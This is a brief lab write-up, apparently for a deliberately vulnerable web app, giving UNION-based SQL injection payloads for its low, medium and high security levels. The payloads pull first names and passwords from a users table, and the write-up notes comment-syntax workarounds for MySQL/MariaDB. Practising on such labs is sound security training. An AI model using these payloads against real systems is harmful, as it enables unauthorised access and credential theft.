The SQL Server that the target uses is MySQL(MaridaDB).

# Low level
The payload is `1' UNION SELECT CONCAT(first_name,"~",password), NULL FROM users;-- -`
- `NULL`: due to 2 columns of the 1st query.
- `CONCAT`: concatenate string.
- `-- -`: due to `&Submit=` parameter in the URL.

# Medium level
Using BurpSuite, the payload will be: `{1..4} UNION SELECT first_name, password FROM users;--`

# High level
The payload is same as low level, but the `--` does not work, searching in MySQL Documentation, I see that there's another symbol that will abort all the command after it, it's `#`. Payload is: `1' UNION SELECT first_name, password FROM users;#`